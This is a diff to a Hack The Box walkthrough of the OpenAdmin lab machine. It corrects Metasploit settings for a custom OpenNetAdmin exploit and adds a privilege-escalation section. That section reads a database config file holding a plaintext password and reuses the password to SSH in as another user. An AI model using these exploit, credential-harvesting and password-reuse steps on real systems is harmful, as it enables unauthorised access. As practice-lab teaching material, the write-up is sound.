@@ -143,9 +143,9 @@ Now that we have the Metasploit exploit within our database lets attempt to run 
 
 ```bash
 msf5 > use exploit/custom/ona
-msf5 exploit(custom/ona) > set RHOST 10.10.10.141
+msf5 exploit(custom/ona) > set RHOST 10.10.10.171
 RHOST => 10.10.10.171
-msf5 exploit(custom/ona) > set TARGETURL /ona/
+msf5 exploit(custom/ona) > set TARGETURI /ona/
 TARGETURL => /ona/
 msf5 exploit(custom/ona) > set LHOST 10.10.10.10 #set to your VPN Address
 LHOST => 10.10.10.10
@@ -186,6 +186,108 @@ cd joanna
 Well, it looks like `www-data` does not have access to view the home directories for the `user.txt` flag.
 
 # Privilege Escalation
+
+So we know the user `www-data` does not have access to the `user.txt` flag, so lets try and see if we can use `jimmy` or `joanna` to pivot to their accounts:
+
+```bash
+ls
+
+config
+config_dnld.php
+dcm.php
+images
+include
+index.php
+local
+login.php
+logout.php
+modules
+plugins
+winc
+workspace_plugins
+```
+
+I spent a lot of time looking through these directories for anything interesting, I was trying to get a good understanding of what the source code was doing under the hood. I came acrossed this directory that looked interesting.
+
+```bash
+pwd
+/opt/ona/www/local
+ls
+config
+nmap_scans
+plugins
+```
+I was initally interested in the `nmap_scans` directory, but then relized that those nmap scan would not help me with a static HTB. I looked in the `config` directory to see if there was anything critical information within the configuration that might be vulnerable:
+
+```bash
+ls
+database_settings.inc.php
+motd.txt.example
+run_installer
+```
+`database_setting.inc.php` looks interesting, lets print the content of that file and review it:
+
+```bash
+cat database_settings.inc.php
+<?php
+
+$ona_contexts=array (
+  'DEFAULT' =>
+  array (
+    'databases' =>
+    array (
+      0 =>
+      array (
+        'db_type' => 'mysqli',
+        'db_host' => 'localhost',
+        'db_login' => 'ona_sys',
+        'db_passwd' => 'n1nj4W4rri0R!',
+        'db_database' => 'ona_default',
+        'db_debug' => false,
+      ),
+    ),
+    'description' => 'Default data context',
+    'context_color' => '#D3DBFF',
+  ),
+);
+?>
+```
+
+We found a database password to the local mysqli instance, one thing to note in HTB, if you find a password try it on other accounts, I will attempt to ssh to `jimmy` and `joanne`'s account with this database password:
+
+```bash
+msf5 exploit(custom/ona) > ssh jimmy@10.10.10.171
+[*] exec: ssh jimmy@10.10.10.171
+
+jimmy@10.10.10.171's password:
+Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Wed Jan 22 16:10:30 UTC 2020
+
+  System load:  0.0               Processes:             110
+  Usage of /:   49.0% of 7.81GB   Users logged in:       0
+  Memory usage: 17%               IP address for ens160: 10.10.10.171
+  Swap usage:   0%
+
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+
+41 packages can be updated.
+12 updates are security updates.
+
+
+Last login: Thu Jan  2 20:50:03 2020 from 10.10.14.3
+jimmy@openadmin:~$
+```
+Golden we are now in has `jimmy`
+
+## Jimmy
 
 *Additional Priv Esc info*
 
